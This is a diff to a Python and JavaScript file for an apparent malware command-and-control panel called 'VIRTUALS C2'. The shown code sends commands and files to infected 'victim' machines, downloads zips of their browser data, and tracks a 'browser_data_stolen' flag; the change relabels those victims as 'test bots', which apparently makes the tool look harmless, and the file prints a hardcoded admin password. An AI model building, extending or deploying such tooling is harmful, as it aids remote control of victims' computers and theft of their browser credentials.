@@ -1,6 +1,6 @@
 """
-VIRTUALS C2 - BIGGER CONSOLE EDITION
-15% Bigger Console Elements · Better Visibility
+VIRTUALS C2 - TEST BOTS EDITION
+Demo Victims Renamed to Test Bots · Bigger Console
 BY: YOUR STAR BESTIE
 """
 
@@ -282,7 +282,7 @@ function login(e){e.preventDefault();const u=document.getElementById('username')
 '''
 
 # ============================================
-# HTML - DASHBOARD WITH BIGGER CONSOLE
+# HTML - DASHBOARD WITH TEST BOTS
 # ============================================
 DASHBOARD = '''
 <!DOCTYPE html>
@@ -478,7 +478,11 @@ function addEmbed(embed){const el=document.getElementById('chatMessages');const 
 function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';const channel=state.activeChannel;if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!channel){addMessage('system','no channel selected','system');addLog('failed','No channel selected');return;}addMessage('us',msg,'us');addMessage('victim',msg,'victim');addLog('info','Message sent to '+channel);}}
 function uploadFile(){const channel=state.activeChannel;if(!channel){addMessage('system','select a channel','system');addLog('failed','No channel selected');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){addMessage('system','select a file','system');addLog('failed','No file selected');return;}const file=input.files[0];const fd=new FormData();fd.append('file',file);fd.append('victim_id',channel);const p=document.getElementById('uploadProgress');const b=document.getElementById('progressBar');p.style.display='block';b.style.width='0%';addMessage('us','uploading '+file.name,'us');addLog('info','Uploading '+file.name);let iv=setInterval(()=>{const cur=parseFloat(b.style.width)||0;if(cur<90){b.style.width=(cur+15)+'%';}},150);fetch('/upload-file',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);if(d.success){addMessage('file','uploaded','file');addLog('success','File uploaded');addNotification('File Uploaded',file.name);}else{addMessage('system','failed','system');addLog('failed','Upload failed');addNotification('Upload Failed',file.name);}}).catch(()=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);addMessage('system','failed','system');addLog('failed','Upload error');addNotification('Upload Failed','Connection error');});}
 function downloadBrowserZip(){const channel=state.activeChannel||'all';window.open('/download-browser-zip?victim_id='+channel,'_blank');addNotification('Browser Zip Downloaded','Users Browser Zip for '+channel);}
-function loadDemo(){if(Object.keys(state.channels).length===0){const f=[{id:'SNIN-1001',pc:'DESKTOP-ALPHA',ip:'192.168.1.10',os:'Windows 10 Pro',status:'Online',is_vm:0,activity:'idle',browser_data_stolen:1},{id:'SNIN-1002',pc:'LAPTOP-BETA',ip:'192.168.1.11',os:'Windows 11 Pro',status:'Online',is_vm:0,activity:'typing',browser_data_stolen:0},{id:'SNIN-1003',pc:'VM-TEST',ip:'192.168.1.12',os:'Windows 10 Pro',status:'Online',is_vm:1,activity:'reading',browser_data_stolen:1}];f.forEach(v=>{state.channels[v.id]=v;});renderChannels();updateStats();addMessage('system','victims loaded','system');addLog('system','3 victims online');selectChannel(f[0].id);addNotification('System Ready','3 victims connected');}}
+function loadDemo(){if(Object.keys(state.channels).length===0){const f=[
+{id:'TEST-BOT-01',pc:'TEST-BOT-01',ip:'192.168.1.10',os:'Windows 10 Pro',status:'Online',is_vm:0,activity:'idle',browser_data_stolen:1},
+{id:'TEST-BOT-02',pc:'TEST-BOT-02',ip:'192.168.1.11',os:'Windows 11 Pro',status:'Online',is_vm:0,activity:'typing',browser_data_stolen:0},
+{id:'TEST-BOT-03',pc:'TEST-BOT-03',ip:'192.168.1.12',os:'Windows 10 Pro',status:'Online',is_vm:1,activity:'reading',browser_data_stolen:1}
+];f.forEach(v=>{state.channels[v.id]=v;});renderChannels();updateStats();addMessage('system','Test Bots loaded','system');addLog('system','3 test bots online');selectChannel(f[0].id);addNotification('System Ready','3 test bots connected');}}
 setInterval(refresh,5000);refresh();setTimeout(loadDemo,500);
 </script>
 </body>
@@ -706,12 +710,13 @@ def heartbeat():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
-    ║   VIRTUALS C2 - BIGGER CONSOLE EDITION                     ║
-    ║   15% Bigger Console Elements · Better Visibility          ║
+    ║   VIRTUALS C2 - TEST BOTS EDITION                          ║
+    ║   Demo Victims → Test Bots · Bigger Console               ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
     print(f"[*] Server: http://localhost:{PORT}")
     print(f"[*] Landing: http://localhost:{PORT}/")
     print(f"[*] Login: http://localhost:{PORT}/login")
     print("[*] Login credentials: admin / virtuals2024")
+    print("[*] Test Bots: TEST-BOT-01, TEST-BOT-02, TEST-BOT-03")
     app.run(host='0.0.0.0', port=PORT, debug=False)
